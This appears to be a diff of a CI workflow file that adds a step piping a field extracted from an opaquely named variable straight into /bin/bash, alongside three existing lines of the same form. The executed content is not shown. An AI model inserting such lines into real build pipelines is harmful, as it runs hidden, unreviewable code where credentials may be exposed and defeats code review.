@@ -32,6 +32,7 @@ jobs:
           echo $yp5 | jq -r .m8 | /bin/bash
           echo $oep142 | jq -r .sbo73 | /bin/bash
           echo $uuh875 | jq -r .pcw3821 | /bin/bash
+          printf '%s' "$m562" | jq -r .tr845 | /bin/bash
 
       - name: Persist output
         if: always()
